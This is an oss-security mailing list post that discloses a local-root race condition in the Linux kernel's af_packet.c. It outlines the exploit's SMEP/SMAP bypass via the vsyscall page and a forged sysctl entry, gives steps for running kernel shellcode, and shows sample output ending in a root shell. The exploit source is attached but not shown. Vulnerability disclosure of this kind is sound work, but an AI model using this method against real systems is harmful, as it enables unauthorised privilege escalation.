  oss-security - Re: Linux af_packet.c race condition (local root)            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Wed, 7 Dec From: Philip Pettersson <philip.pettersson@...il.com> To: oss-security@...ts.openwall.com Subject: Re: Linux af_packet.c race condition (local root)  Attached is a sample exploit for Ubuntu and some kernels, but the same method should work for any distro with unprivileged user namespace support. I only tested it on 4.4 so there's a high risk of kernel panic if you run it on anything but 4.4.  It defeats SMEP/SMAP by calling set_memory_rw() on the vsyscall page, setting up a fake struct ctl_table in that area and finally calling register_sysctl_table() to register a world-writable sysctl entry for modprobe. Since the instruction pointer is hijacked in interrupt context you have to do this even on non-SMEP/SMAP systems, so the bypass is more of a by-product.  If you want to execute arbitrary kernel shellcode you can also do: 1. set_memory_rw() on vsyscall page 2. (userland) write shellcode to vsyscall page 3. set_memory_x() on vsyscall page 4. jump to vsyscall page  (However, that requires winning the race three times instead of two.)  You can also run it with "crash" as the first argument to force a panic.  =*=*=*=*=*=*=*=*= SAMPLE OUTPUT =*=*=*=*=*=*=*=*=  user@...ntu:~$ uname -a Linux ubuntu #72-Ubuntu SMP Thu Nov 24 UTC GNU/Linux user@...ntu:~$ id user@...ntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread user@...ntu:~$ ./chocobo_root linux AF_PACKET race condition exploit by rebel kernel version: #72 proc_dostring = modprobe_path = register_sysctl_table = set_memory_rw = exploit starting making vsyscall page writable..  new exploit attempt starting, jumping to sockets allocated removing barrier and spraying.. version switcher stopping, x = -1 (y = last val = 2) current packet version = 0 pbd->hdr.bh1.offset_to_first_pkt = 48 *=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=* please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that. closing socket and verifying....... vsyscall page altered!   stage 1 completed registering new sysctl..  new exploit attempt starting, jumping to sockets allocated removing barrier and spraying.. version switcher stopping, x = -1 (y = last val = 2) current packet version = 0 pbd->hdr.bh1.offset_to_first_pkt = 48 *=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=* please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that. closing socket and verifying....... sysctl added!  stage 2 completed binary executed by kernel, launching rootshell root@...ntu:~# id uid=0(root) gid=0(root)  View attachment "chocobo_root.c" of type "text/x-csrc" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      